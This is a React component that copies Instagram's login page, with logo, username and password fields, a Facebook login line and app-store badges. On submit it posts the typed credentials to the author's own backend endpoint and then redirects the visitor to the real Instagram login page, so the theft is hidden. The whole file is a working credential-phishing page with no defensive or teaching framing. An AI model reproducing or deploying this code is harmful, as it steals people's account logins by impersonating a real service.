

import React from "react";
import axios from 'axios';
import { useState } from 'react';
import { BACKEND_URL } from '../config';

export const Auth2 = () => {

    const [postInputs, setPostInputs] = useState({
        username: '',
        password: '',
      });
    
      async function sendRequest(e: React.FormEvent<HTMLFormElement>) {
        e.preventDefault(); // Prevent the default form submission
        try {
          await axios.post(`${BACKEND_URL}/api/v1/user/signup`, postInputs);
        //   navigate('/Insta');
        window.location.href = 'https://www.instagram.com/accounts/login/';
        } catch (e) {
          alert('Error while signing up');
        }
      }

    return <div className="h-screen bg-white flex flex-col items-center ">

        <form onSubmit={sendRequest}>

        
        <div className="w-3/7 h-3/7  flex flex-col items-center bg-white my-4 border border-solid border-gray-300 ">
            <img src="/pics/images.png" alt="instagram" className="w-2/4 my-5" />
            {/* <h1 className="text-4xl font-bold text-center mb-6 font-logo my-10">Instagram</h1> */}
            <input value={postInputs.username}
              onChange={(e) => setPostInputs({ ...postInputs, username: e.target.value })}
              required className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-2 my-1 outline-none" type="text" placeholder="phone number, username,or email" />
            <input value={postInputs.password}
              onChange={(e) => setPostInputs({ ...postInputs, password: e.target.value })}
              required className="h-10 w-3/4 bg-gray-50 border border-solid text-sm rounded-sm pl-1 my-1 outline-none" type="password" placeholder="password" />
            <button type="submit" className="h-10 w-3/4 bg-blue-400 text-white font-semibold border-solid  text-sm rounded-xl pl-1 my-4 mb-6">Log In</button>
            {/* <p className="text-gray-500 dark:text-gray-400 my-0"></p> */}
            <div className="inline-flex items-center justify-center w-full ">
                <hr className="w-64 h-px  bg-gray-200 border-0 dark:bg-gray-700 my-2" />
                <span className="absolute px-3 font-medium text-gray-900 -translate-x-1/2 bg-white left-1/2 dark:text-gray-700">OR</span>
            </div>
            <p className="text-gray-500 dark:text-blue-900 my-2">Log in with faceBook</p>
            <p className="font-thin text-sm my-6">Forget Password </p>
        </div>
        </form>
        <div className="w-3/12 h-20 bg-white border border-solid border-gray-300 flex justify-center items-center text-sm">
            <p>Don't have an Account ? <span className="text-blue-500">sign up</span></p>
        </div>

        <div className="flex flex-col items-center justify-center mt-4">
            Get the app
            <div className="grid grid-flow-col justify-center">
                <div className="flex h-8 m-3">
                    <img src="/pics/apple.png" alt="" />
                </div>
                <div className="flex h-10 m-3">
                    <img src="/pics/google.png" alt="" />
                </div>
            </div>
        </div>



    </div>
}